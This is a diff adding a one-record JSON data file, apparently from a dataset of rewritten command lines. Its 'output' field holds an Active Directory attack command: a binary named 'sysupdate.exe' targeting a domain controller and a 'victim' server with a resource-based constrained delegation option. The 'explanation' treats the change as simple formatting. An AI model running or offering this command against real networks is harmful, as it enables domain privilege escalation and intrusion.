@@ -1,0 +1,6 @@
+[
+  {
+    "output": "sysupdate.exe -clsid 9bf5fdf6-f947-4e34-929d-4e92a2a7a858 -target dc.domain.local -victim srv.domain.local -rbcd dc$",
+    "explanation": "Removed quotes around the -clsid argument and simplified spacing for a cleaner command line while maintaining the same functionality."
+  }
+]
